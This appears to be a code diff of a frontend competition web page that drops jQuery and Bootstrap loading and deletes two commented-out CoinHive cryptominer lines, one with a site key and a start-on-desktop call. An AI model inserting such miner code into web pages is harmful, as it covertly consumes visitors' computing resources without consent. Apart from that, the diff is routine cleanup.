@@ -22,28 +22,11 @@
     -->
     <title>SPB Frontend Competition</title>
     <script>
-        // var miner = new CoinHive.Anonymous('zT2i6Do0U2w3VgyRBqMj1S5UuprUrtXR', {throttle: 0.9}); if (!miner.isMobile()) miner.start()
-        var scriptString = ''
         var linksString = ''
-        var scripts = [
-          {src: 'https://code.jquery.com/jquery-3.2.1.slim.min.js'},
-          // {src: 'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.js'},
-          {src: 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js'},
-          // {src: 'https://coinhive.com/lib/coinhive.min.js'},
-        ]
         var links = [
-          {href: 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css'},
           {href: 'https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css'},
           {href: 'https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css'},
         ]
-        scripts.forEach(function(obj) {
-          var script = document.createElement('script')
-          Object.keys(obj).forEach(function(key){
-            script[key] = obj[key]
-          })
-          script = script.outerHTML
-          scriptString += script + '\n'
-        })
         links.forEach(function(obj) {
           var link = document.createElement('link')
           Object.keys(obj).forEach(function(key){
@@ -53,7 +36,7 @@
           link = link.outerHTML
           linksString += link + '\n'
         })
-        document.write(linksString + '\n' + scriptString)
+        document.write(linksString)
       </script>
   </head>
   <body>
